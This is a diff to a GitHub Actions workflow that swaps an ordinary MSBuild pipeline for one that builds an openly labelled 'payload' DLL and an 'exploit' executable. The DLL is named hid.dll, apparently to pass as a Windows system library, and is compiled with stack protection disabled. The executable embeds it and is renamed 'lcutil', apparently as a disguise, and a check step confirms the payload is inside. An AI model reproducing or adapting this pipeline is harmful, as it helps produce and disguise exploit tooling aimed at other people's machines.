@@ -1,47 +1,52 @@
-# This workflow uses actions that are not certified by GitHub.
-# They are provided by a third-party and are governed by
-# separate terms of service, privacy policy, and support
-# documentation.
-
-name: MSBuild
+name: build
 
 on:
   push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-
-env:
-  # Path to the solution file relative to the root of the project.
-  SOLUTION_FILE_PATH: .
-
-  # Configuration type to build.
-  BUILD_CONFIGURATION: Release
-
-permissions:
-  contents: read
+  workflow_dispatch:
 
 jobs:
   build:
     runs-on: windows-latest
-
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      - name: Add MSBuild to PATH
-        uses: microsoft/setup-msbuild@v1.0.2
-
-      - name: Restore NuGet packages
-        working-directory: ${{env.GITHUB_WORKSPACE}}
-        run: nuget restore ${{env.SOLUTION_FILE_PATH}}
-
-      - name: Build and Publish
-        working-directory: ${{env.GITHUB_WORKSPACE}}
-        run: msbuild /m /p:Configuration=${{env.BUILD_CONFIGURATION}} /p:OutDir="${{ github.workspace }}/publish_output/" ${{env.SOLUTION_FILE_PATH}}
-
-      - name: Upload Build Artifacts
-        uses: actions/upload-artifact@v4
+      - uses: ilammy/msvc-dev-cmd@v1
         with:
-          name: compiled-app-artifact
-          path: ${{ github.workspace }}/publish_output/
+          arch: x64
+
+      # 1. payload DLL, built before the resource script is compiled
+      - name: Build payload
+        shell: cmd
+        run: |
+          if not exist build\payload mkdir build\payload
+          cl /nologo /LD /MT /O2 /GS- /D_USRDLL payload.c /Fo:build\payload\ /link /OUT:build\payload\hid.dll /PDB:build\payload\hid.pdb
+          if errorlevel 1 exit /b 1
+          copy /y build\payload\hid.dll hid.dll
+          if errorlevel 1 exit /b 1
+          dir hid.dll
+
+      # 2. exploit exe, which embeds hid.dll via the rc
+      - name: Build exploit
+        shell: cmd
+        run: |
+          msbuild SigDrop.vcxproj /nologo /m /p:Configuration=Release /p:Platform=x64 "/p:OutDir=%CD%\out\\" /p:TargetName=lcutil
+          if errorlevel 1 exit /b 1
+
+      # 3. sanity checks so a silent failure doesn't produce a broken exe
+      - name: Verify
+        shell: pwsh
+        run: |
+          $exe = Get-ChildItem out -Filter *.exe | Select-Object -First 1
+          if (-not $exe) { throw "build produced no exe" }
+          $dll = Get-Item build\payload\hid.dll
+          Write-Host "exe: $($exe.Length) bytes / dll: $($dll.Length) bytes"
+          if ($exe.Length -lt 60000) { throw "exe is only $($exe.Length) bytes - payload probably not embedded" }
+          New-Item -ItemType Directory dist | Out-Null
+          Copy-Item $exe.FullName dist\
+          Copy-Item $dll.FullName dist\
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: lcutil
+          path: dist\
+          if-no-files-found: error
